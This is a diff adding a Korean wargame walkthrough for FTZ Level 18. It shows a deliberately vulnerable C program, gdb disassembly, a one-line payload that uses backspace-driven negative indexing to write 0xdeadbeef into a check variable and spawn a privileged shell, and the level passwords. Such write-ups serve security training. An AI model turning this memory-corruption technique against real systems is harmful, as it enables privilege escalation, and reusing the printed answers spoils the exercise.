@@ -164,3 +164,105 @@ Dump of assembler code for function main:
 
 
 답 == why did you do it
+
+
+
+
+
+
+
+
+#================================================================================#
+#FTZ Level 18
+hint)
+
+#include <stdio.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <unistd.h>
+void shellout(void);
+int main()
+{
+  char string[100];
+  int check;
+  int x = 0;
+  int count = 0;
+  fd_set fds;
+  printf("Enter your command: ");
+  fflush(stdout);
+  while(1)
+    {
+      if(count >= 100)
+        printf("what are you trying to do?\n");
+      if(check == 0xdeadbeef)
+        shellout();
+      else
+        {
+          FD_ZERO(&fds);
+          FD_SET(STDIN_FILENO,&fds);
+ 
+          if(select(FD_SETSIZE, &fds, NULL, NULL, NULL) >= 1)
+            {
+              if(FD_ISSET(fileno(stdin),&fds))
+                {
+                  read(fileno(stdin),&x,1);
+                  switch(x)
+                    {
+                      case '\r':
+                      case '\n':
+                        printf("\a");
+                        break;
+                      case 0x08:
+                        count--;
+                        printf("\b \b");
+                        break;
+                      default:
+                        string[count] = x;
+                        count++;
+                        break;
+                    }
+                }
+            }
+        }
+    }
+}
+
+void shellout(void)
+{
+  setreuid(3099,3099);
+  execl("/bin/sh","sh",NULL);
+}   
+
+
+#FTZ Level 18 풀이 과정)
+
+check값이 =deadbeef면 shellout이 실행되고 권한을 얻어오며 쉘이 실행된다는 것을 알 수 있었다.
+코드가 좀 복잡해 보이지만, 쉽게 말하면 string[100]을 넘을 순 있지만, count가 100을 넘으면 "what are you trying to do?\n" 가 뜨는 것을 알 수 있다.
+밑에 스위치 문을 보면  0x08은  count를 -- 해주고 그외에는 count를 ++한다.
+조꼼 이상한 조건이긴 하다만, 코드를 까보자.
+
+근데 코드가 너무 길다.
+
+0x080485ab <main+91>:	cmp    DWORD PTR [ebp-104],0xdeadbeef
+일단 ebp-104에서 비교하는 것을 알 수 있다. 그럼 ebp-104위치에 deadbeef라는 값을 추가해주면 되겠는데,
+string[100]의 위치를 알아야겠다.
+ default:
+                        string[count] = x;
+                        count++;
+                        break;
+                    }
+스트링을 한번도 접근 안하다가 마지막쯤에 버퍼를 추가해주며 count를 추가해주는 것을 볼 수 있다.
+그렇다면 마지막쯤으로 넘어가보면 찾을 수 있다고 판단하고 넘어갔다.
+
+0x08048741 <main+497>:	jmp    0x8048770 <main+544>
+0x08048743 <main+499>:	lea    eax,[ebp-100]
+jmp 그니까,  if(count >= 100)를 확인하러 간 후에 ebp-100값을 eax에 옮기고 ebp-252로 옮기는 것을 볼 수 있었다.
+스트링의 위치는 ebp-100이고 , check의 위치는 104다. 이번에는 check의 위치가 더 크다.
+-4의 거리에 deadbeef를 넣어주면 해결이 되겠다.
+
+(python -c 'print "\x08"*4+"\xef\xbe\xad\xde"'; cat) |./attackme
+
+평소와 같이 아무것도 아닌 것처럼 명령을 받지만, 명령어를 오타나면 shell 커맨드 찾을 수 없는 오류를 나타내는 것을 볼 수 있다.
+my-pass로 비번을 알아낸다.
+
+답 == swimming in pink
